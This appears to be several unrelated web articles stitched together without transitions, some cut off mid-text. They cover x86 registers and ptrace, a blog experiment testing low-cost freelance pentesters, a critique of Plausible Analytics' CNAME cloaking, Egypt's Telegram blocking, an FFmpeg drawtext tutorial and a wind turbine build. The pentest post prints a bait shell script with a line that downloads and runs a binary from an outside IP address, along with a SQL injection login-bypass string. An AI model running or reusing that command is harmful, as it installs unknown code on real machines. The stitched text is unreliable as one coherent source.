breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>

Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>

<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>

<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>

<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>.

<p>Let’s see how the output looks, shall we?</p>

<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>

<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>

<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>

<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>

<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4

<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445276018" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>

<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>

<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.

              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>

<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
